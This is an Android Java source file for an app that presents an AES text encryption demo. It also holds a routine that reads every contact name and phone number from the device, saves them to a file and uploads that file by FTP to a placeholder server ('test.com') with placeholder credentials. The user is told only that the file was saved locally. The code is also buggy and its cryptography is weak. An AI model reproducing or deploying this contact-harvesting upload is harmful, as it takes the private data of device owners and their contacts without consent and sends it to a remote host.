package com.example.getcontacts;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import org.apache.commons.net.ftp.FTPClient;
import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStreamWriter;
import java.net.URI;
import java.security.MessageDigest;
import java.util.List;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends AppCompatActivity {
    private static final  String FILE_NAME = "Contacts.txt";  //Constant for file name

    //Decl.Fields for encryption
    EditText inputText, inputPassword;
    TextView outputText;
    Button enctBtn, decBtn;
    String outputString;
    String AES = "AES";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        inputText = (EditText) findViewById(R.id.inputText);
        inputPassword = (EditText) findViewById(R.id.password);

        outputText = (TextView) findViewById(R.id.outputText);
        enctBtn = (Button) findViewById(R.id.encBtn);
        decBtn = (Button) findViewById(R.id.decBtn);


        enctBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                try {
                    outputString = encrypt(inputText.getText().toString(), inputPassword.getText().toString());
                    outputText.setText(outputString);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });


        decBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                try {
                    outputString = decrypt (outputString,inputPassword.getText().toString());
                } catch (Exception e) {
                    Toast.makeText(MainActivity.this,"Wrong password", Toast.LENGTH_LONG).show();
                    e.printStackTrace();
                }
                outputText.setText(outputString);
            }
        });
    }

    //Decryption
    private String decrypt(String outputString, String password) throws Exception {
        SecretKeySpec key = generateKey(password);
        Cipher c = Cipher.getInstance(AES);
        c.init(Cipher.DECRYPT_MODE, key);
        byte[] decodedValue = Base64.decode(outputString, Base64.DEFAULT);
        byte[] decValue = c.doFinal(decodedValue);
        String decryptedValue = new String(decValue);
        return decryptedValue;
    }
    //Encryption Method using set password
    private String encrypt(String Data, String password) throws Exception{
        SecretKeySpec key = generateKey(password);
        Cipher c = Cipher.getInstance(AES);
        c.init(Cipher.ENCRYPT_MODE,key);
        byte[] encVal = c.doFinal(Data.getBytes());
        String encryptedValue = Base64.encodeToString(encVal, Base64.DEFAULT);
        return encryptedValue;
    }

    //Generate the secret key using the given Password
    private SecretKeySpec generateKey(String password) throws Exception{
        final MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] bytes = password.getBytes("UTF-8"); //converting the password into byte
        digest.update(bytes, 0 , bytes.length);
        byte[] key = digest.digest();
        SecretKeySpec secretKeySpec = new SecretKeySpec(key, "AES");
        return secretKeySpec;
    }

    public void btnGetContact(View v) throws FileNotFoundException {
        getContacts();

    }

    public void getContacts() throws FileNotFoundException {
       //First check if the permission is allowed, if not it will launch the request to give permission
       if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED){
           ActivityCompat.requestPermissions(this, new String[] {Manifest.permission.READ_CONTACTS},0);
       }

       //Query to Request contact
        ContentResolver contentResolver = getContentResolver();
        Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        Cursor cursor = contentResolver.query(uri, null, null, null,null);
        Log.i("GetContact", "Total number of contacts are:" + Integer.toString(cursor.getCount()));
        if (cursor.getCount() > 0){
            while (cursor.moveToNext()){
                String contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String contactNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                String both = contactName + contactNumber;

                Log.i("GetContacts", "Contact Name: " + contactName + " Phone number: " + contactNumber);

                //Save file to local dir
                FileOutputStream fos = null;
                try {
                    fos = openFileOutput(FILE_NAME, MODE_PRIVATE);
                    fos.write(both.getBytes());


                    Toast.makeText(this, "Saved to " + getFilesDir() + "/" + FILE_NAME, Toast.LENGTH_LONG).show();  //Just to show File location

                    new CreateServerConn().execute();
                } catch (FileNotFoundException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                } finally {
                    if (fos != null){
                        try {
                            fos.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }

            }
        }
    }


    class CreateServerConn extends AsyncTask<Void, Void, Void>{

        String TAG = "";
        @Override
        protected Void doInBackground(Void... voids) {

            String server = "http://test.com"; //Desired URL
            String username = "xxxx"; //login details for
            String password = "xxxx";

            FTPClient ftpClient = new FTPClient();

            try{
                ftpClient.connect(server);
                ftpClient.enterLocalPassiveMode();
                Log.d(TAG, "Connected");

                String dirPath = "/Public_html/upload/files"; //hypothetically


                //Uploading the file
                File file = new File(getFilesDir(), "Contacts.txt");


                InputStream inputStream = new FileInputStream(file);
                ftpClient.storeFile(dirPath + "/Contacts.txt", inputStream);
                inputStream.close();



                ftpClient.logout();
                ftpClient.disconnect();

                Log.d(TAG, "Disconnected");
            }catch (Exception e){
                e.printStackTrace();
            }

            return null;
        }
    }


}